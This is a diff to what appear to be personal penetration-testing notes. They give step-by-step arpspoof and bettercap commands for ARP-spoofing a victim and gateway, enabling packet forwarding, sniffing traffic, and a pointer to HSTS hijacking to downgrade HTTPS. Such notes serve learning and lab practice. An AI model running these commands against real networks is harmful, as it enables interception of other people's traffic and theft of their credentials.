@@ -12,15 +12,15 @@ ARP spoofing is a type of attack in which a malicious actor sends falsified ARP 
 
 ### Usage:
 ```
-$ arpspoof -i <interface> -t <target-ip> <gateway-ip>
-$ arpspoof -i <interface> -t <gateway-ip> <target-ip>
+arpspoof -i <interface> -t <target-ip> <gateway-ip>
+arpspoof -i <interface> -t <gateway-ip> <target-ip>
 ```
 
 > **_NOTE:_**<br>
 > By default, the linux kernel does not forward packets between interfaces. <br>
 > We want our machine to act as a router, so we need to enable packet forwarding by running the following command:
 > ```
-> $ echo 1 > /proc/sys/net/ipv4/ip_forward
+> echo 1 > /proc/sys/net/ipv4/ip_forward
 > ```
 
 ### Attack example:
@@ -30,18 +30,18 @@ $ arpspoof -i <interface> -t <gateway-ip> <target-ip>
 
 1. Enable IP forwarding
 ```
-$ echo 1 > /proc/sys/net/ipv4/ip_forward
+echo 1 > /proc/sys/net/ipv4/ip_forward
 ```
 
 2. Launch an ARP spoofing attack to the victim:
 ```
-$ arpspoof -i eth0 -t 192.168.1.10 192.168.1.1
+arpspoof -i eth0 -t 192.168.1.10 192.168.1.1
 # this command changes the arp table of the target (victim)
 ```
 
 3. Launch an ARP spoofing attack to the gateway:
 ```
-$ arpspoof -i eth0 -t 192.168.1.1 192.168.1.10 
+arpspoof -i eth0 -t 192.168.1.1 192.168.1.10 
 # this command changes the arp table of the gateway (router)
 ```
 
@@ -61,13 +61,13 @@ It is organized in modules, each module has its own commands and options.
 
 ### Install bettercap if not installed
 ```
-$ apt get install bettercap
+apt get install bettercap
 ```
 
 ### Usage:
 To launch bettercap run: 
 ```
-$ bettercap -iface <interface>
+bettercap -iface <interface>
 ```
 
 > **_NOTE:_**<br>
@@ -77,16 +77,31 @@ $ bettercap -iface <interface>
 ### Attack example:
 
 - interface: eth0
+- target's ip: 192.168.1.10
 
-1. Launch bettercap
+1. Enable packet forwarding
 ```
-$ bettercap -iface eth0
+echo 1 > /proc/sys/net/ipv4/ip_forward
 ```
 
-2. Turn on the probe module<br>
+> **_TO INVESTIGATE:_**<br>
+> Last time I run this attack on a wireless I had to run the following commands:
+> ```
+> iptables -A FORWARD -i wlan0 -j ACCEPT
+> iptables -A FORWARD -o wlan0 -j ACCEPT
+>```
+> - Is this need it if the attacker and/or the victim is using wifi?
+> - Is this needed when using wired?
+
+2. Launch bettercap
+```
+bettercap -iface eth0
+```
+
+3. Turn on the probe module<br>
 The probe module keeps probing for new hosts on the network by sending dummy UDP packets to every possible IP on the subnet.
 ```
-$ net.probe on
+net.probe on
 ```
 > **_NOTE:_**<br>
 > The probe module automatically turns the net.recon module on.<br>
@@ -95,36 +110,39 @@ $ net.probe on
 > **_NOTE:_**<br>
 > To show a list of all connected clients on the network type:<br>
 > ```
-> $ net.show
+> net.show
 > ```
-> 
-TODO: CONTINUE HERE
+>
 
-- set arp spoofing parameters
+4. Set arp spoofing parameters
 ```
-$ set arp.spoof.fullduplex true
-$ set arp.spoof.targets <target-ip1>,<target-ip2>,...
+set arp.spoof.fullduplex true
+set arp.spoof.targets 192.168.1.10
 ```
+> **_NOTE:_**<br>
+> ```set arp.spoof.fullduplex true``` tells bettercap to spoof both target and gateway.
+> If you want to spoof multiple targets just enter a list of targets ip separetad by comma.
 
-- turn on arp spoof module
+5. Turn on arp spoof module
 ```
-$ arp.spoof on
-```
-
-- capture requests
-```
-$ net.sniff on
+arp.spoof on
 ```
 
-you can also run bettercap by passing a text file with all commands to execute
+6. Capture requests<br>
+To see all requests and responses the targets are making and receiving activate the net.sniff module:  
 ```
-$ bettercap -iface <interface> -caplet spoof.cap
+net.sniff on
 ```
-the spoof.cap constains all the previous commands
+
+> **_NOTE:_**
+> You can run bettercap with a list of commands stored in a file like:<br>
+> ```
+> bettercap -iface <interface> -caplet spoof.cap
+> ```
 
 ## Downgrade https to http
 ```
-$ hstshijack/hstshijack
+hstshijack/hstshijack
 ```
 
 ## JS injection
